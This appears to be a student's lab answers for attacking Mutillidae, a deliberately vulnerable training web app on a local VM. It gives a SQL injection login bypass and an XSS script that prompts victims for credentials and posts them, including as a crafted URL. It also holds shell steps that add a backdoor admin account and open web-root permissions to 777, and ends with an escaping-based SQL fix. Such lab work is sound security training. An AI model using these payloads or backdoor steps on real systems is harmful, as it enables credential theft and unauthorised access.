Question 1
-----------

tohyongcheng' OR '1=1
tohyongcheng' OR '1=1

Question 2
-----------

<script>alert('attacked')</script>


<script>
var username = prompt('Please enter your username', '');
var password = prompt('Please enter your password', '');

var form=document.createElement('form');
form.method='POST';
form.action='index.php?page=capture-data.php';

var userField=document.createElement('input');
userField.type='text';
userField.name='username';
userField.value = username;

var passwordField = document.createElement('input');
passwordField.type='password';
passwordField.name='password';
passwordField.value=password;


form.appendChild(userField);
form.appendChild(passwordField);

document.body.appendChild(form);

form.submit();

</script>

http://192.168.56.101/mutillidae/index.php?page=user-info.php&username=%3Cscript%3E+var+username+%3D+prompt%28%27Please+enter+your+username%27%2C+%27%27%29%3B+var+password+%3D+prompt%28%27Please+enter+your+password%27%2C+%27%27%29%3B++var+form%3Ddocument.createElement%28%27form%27%29%3B+form.method%3D%27POST%27%3B+form.action%3D%27index.php%3Fpage%3Dcapture-data.php%27%3B++var+userField%3Ddocument.createElement%28%27input%27%29%3B+userField.type%3D%27text%27%3B+userField.name%3D%27username%27%3B+userField.value+%3D+username%3B++var+passwordField+%3D+document.createElement%28%27input%27%29%3B+passwordField.type%3D%27password%27%3B+passwordField.name%3D%27password%27%3B+passwordField.value%3Dpassword%3B+++form.appendChild%28userField%29%3B+form.appendChild%28passwordField%29%3B++document.body.appendChild%28form%29%3B++form.submit%28%29%3B++%3C%2Fscript%3E&password=&user-info-php-submit-button=View+Account+Details





Question 3
-----------


Linux commands:
- pwd
- echo "$(whoami)"
- cut -d: -f1 /etc/group

guess its www-data

useradd -d /var/www -g www-data -m admin
echo "admin:hackerhack" | chpasswd

change the permissions
- chmod -R 777 /var/www/mutillidae

change code to:

$lQuery  = "SELECT * FROM accounts WHERE username='".
$conn->real_escape_string($lUsername) .
"' AND password='" .
$conn->real_escape_string($lPassword) .
"'";





